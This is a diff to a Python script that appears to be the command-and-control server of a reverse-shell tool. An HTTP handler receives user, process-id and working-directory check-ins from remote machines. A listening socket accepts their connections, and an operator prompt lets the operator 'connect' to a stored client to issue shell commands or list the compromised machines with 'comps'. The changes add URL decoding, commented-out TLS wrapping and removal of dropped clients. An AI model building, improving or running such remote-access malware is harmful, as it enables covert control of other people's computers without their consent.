@@ -4,8 +4,9 @@ import socketserver
 from threading import Thread
 from legend import server_legacy
 
-import socket, base64
+import socket, base64, ssl
 from http.server import BaseHTTPRequestHandler
+from urllib.parse import unquote
 
 global req_head, flag
 flag = False
@@ -21,6 +22,7 @@ class Connect(BaseHTTPRequestHandler):
         self.pid_cle = pid_cle
         self.pwd_cle = pwd_cle
         self.s = ''
+        self.cont = ''
         self.serv_ip = server_address[0]
         self.serv_port = server_address[1]
         self.server_address = server_address
@@ -29,9 +31,12 @@ class Connect(BaseHTTPRequestHandler):
         self.addr = ''
 
     def initiate(self):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
         self.s.bind((self.server_address))
         self.s.listen(5)
+        # self.s = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        # self.s.load_cert_chain("D:\\certs\\cert.pem", "D:\\certs\\key.pem")
+        # self.s = s.wrap_socket(ss, server_side=True)
         self.client, self.addr = self.s.accept()
 
     def send(self, cmd=''):
@@ -58,8 +63,8 @@ class Server(BaseHTTPRequestHandler):
             keys, vals = [], []
 
             for el in req_head:
-                key = el.split('=')[0]
-                val = el.split('=')[1]
+                key = unquote(el.split('=')[0])
+                val = unquote(el.split('=')[1])
                 keys.append(key)
                 vals.append(val)
 
@@ -69,6 +74,7 @@ class Server(BaseHTTPRequestHandler):
 
             flag = True
             self.send_response(200)
+            self.end_headers()
 
     def log_message(self, format, *args):
         return
@@ -153,7 +159,6 @@ server.start()
 
 while True:
     if flag:
-        flag = False
         user = req_head.get('user')
         pid = req_head.get('pid')
         pwd = req_head.get('pwd')
@@ -163,6 +168,7 @@ while True:
         c = Connect(user_cle=user, pid_cle=pid, pwd_cle=pwd, clientip_cle=client_ip, server_address=shell_address, alias_cle=str(alias))
         clients[str(alias)] = c
         alias += 1
+        flag = False
 
     com = input("Command >> ").split()
     if com == ['help']:
@@ -171,6 +177,7 @@ while True:
     elif 'connect' in com:
         try:
             Client = clients.get(com[1])
+            ALIAS = com[1]
             Client.initiate()
             cur_pwd = pwd
             while True:
@@ -192,6 +199,7 @@ while True:
         except Exception as e:
             cprint.err(f'{e} is wrong')
             Client.close()
+            clients.pop(ALIAS)
 
     elif 'comps' in com:
         prety(clients)
